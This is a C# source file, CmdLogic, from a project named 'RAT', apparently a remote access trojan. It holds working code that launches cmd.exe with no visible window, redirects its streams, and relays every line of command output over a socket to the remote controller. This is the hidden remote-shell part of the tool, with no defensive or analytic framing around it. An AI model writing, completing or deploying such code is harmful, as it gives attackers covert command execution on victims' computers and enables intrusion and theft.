using RAT.Interfaces;
using System;
using System.Diagnostics;
using System.Text;

namespace RAT.Cmd
{
    /// <summary>
    /// Logic related to windows cmd.
    /// </summary>
    public class CmdLogic : ICmdLogic
    {
        private readonly ISocketConnectionSendingLogic _socketConnectionSendingLogic;
        private readonly ISocketStateLogic _stateLogic;

        /// <summary>
        /// Logic related to cmd.
        /// </summary>
        /// <param name="sendingLogic">Socket sending logic.</param>
        /// <param name="stateLogic">Our client state logic.</param>
        public CmdLogic(
            ISocketConnectionSendingLogic sendingLogic,
            ISocketStateLogic stateLogic)
        {
            _socketConnectionSendingLogic = sendingLogic;
            _stateLogic = stateLogic;
        }

        /// <summary>
        /// Creates and configures new cmd process.
        /// </summary>
        /// <returns>Launched cmd process.</returns>
        public Process CreateNewCmdProcess()
        {
            var cmdProcess = new Process()
            {
                StartInfo = new ProcessStartInfo()
                {
                    FileName = "cmd.exe",
                    CreateNoWindow = true,
                    RedirectStandardOutput = true,
                    RedirectStandardInput = true,
                    RedirectStandardError = true,
                    StandardOutputEncoding = Encoding.ASCII,
                },
            };

            // Cmd output handler which will redirect output and error result to client after command is executed.
            cmdProcess.OutputDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler);
            cmdProcess.ErrorDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler);

            // Launch cmd process.
            cmdProcess.Start();
            cmdProcess.BeginOutputReadLine();
            cmdProcess.BeginErrorReadLine();
            return cmdProcess;
        }

        /// <summary>
        /// This will send command execution output result to client regardless of output being error or not.
        /// </summary>
        /// <param name="sendingProcess">Sender.</param>
        /// <param name="outLine">Event sender's data.</param>
        private void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine)
        {
            var state = _stateLogic.State;

            if (outLine.Data != null &&
                state.CommandDataArray != null &&
                !state.ClientCmdProcess.HasExited)
            {
                string cleanCmdMessage = this.GetFormattedCmdForResponse(outLine.Data);

                _socketConnectionSendingLogic.SendDataToClient(
                    state.ClientMainSocket, Encoding.ASCII.GetBytes(cleanCmdMessage), _socketConnectionSendingLogic.OnMessageSend);
            }
        }

        /// <summary>
        /// Formats and adds missing characters + removes unneded ones.
        /// </summary>
        /// <param name="cmdCommand">Cmd command in FULL format a.k.a "C:\Users\SomeUser>More? echo 1"</param>
        /// <returns>Formatted cmd command.</returns>
        private string GetFormattedCmdForResponse(string cmdCommand)
        {
            // Removes "More?" from cmd response.
            var cmdString = cmdCommand;
            int index = cmdString.IndexOf(">More? ", StringComparison.Ordinal);
            string cleanCmdMessage = (index < 0)
                ? cmdString
                : cmdString.Remove(index + 1, "More? ".Length);

            // Without "\n" this will be poorly formatted.
            return cleanCmdMessage + "\n";
        }
    }
}